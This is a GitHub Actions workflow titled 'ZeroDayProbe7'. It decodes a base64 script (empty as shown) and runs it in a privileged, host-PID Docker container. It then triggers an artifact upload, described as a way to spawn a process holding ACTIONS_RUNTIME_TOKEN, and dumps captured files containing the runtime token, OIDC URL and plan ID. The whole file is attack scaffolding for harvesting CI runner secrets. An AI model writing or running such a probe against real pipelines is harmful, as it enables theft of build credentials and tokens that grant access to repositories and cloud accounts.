name: ZeroDayProbe7
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy monitor
        run: |
          printf '%s' '' | base64 -d > /tmp/mon.sh
          chmod +x /tmp/mon.sh
          echo "probe7" > /tmp/probe.txt
          nohup docker run --rm --privileged --pid=host \
            -v /tmp/mon.sh:/mon.sh:ro \
            -v /tmp:/tmp_host:rw \
            ubuntu:24.04 bash /mon.sh > /tmp/mon.log 2>&1 &
          echo $! > /tmp/bgpid.txt
          sleep 3
      - name: Spawn token (upload-artifact creates Node.js with ACTIONS_RUNTIME_TOKEN)
        uses: actions/upload-artifact@v4
        with:
          name: probe-art
          path: /tmp/probe.txt
      - name: Collect results
        run: |
          sleep 40
          kill $(cat /tmp/bgpid.txt) 2>/dev/null || true
          echo "=RESULTS_START="
          cat /tmp/mon.log 2>/dev/null || echo "no log"
          echo "=RESULTS_END="
          echo "=HOST_FILES_START="
          ls -la /tmp/ZD_* 2>/dev/null || echo "no ZD files written"
          echo "ZD_TOKEN_LEN=$(wc -c < /tmp/ZD_RUNTIME_TOKEN.txt 2>/dev/null || echo 0)"
          echo "ZD_OIDC_URL=$(cat /tmp/ZD_OIDC_URL.txt 2>/dev/null)"
          echo "ZD_PLAN_ID=$(cat /tmp/ZD_PLAN_ID.txt 2>/dev/null)"
          echo "=HOST_FILES_END="
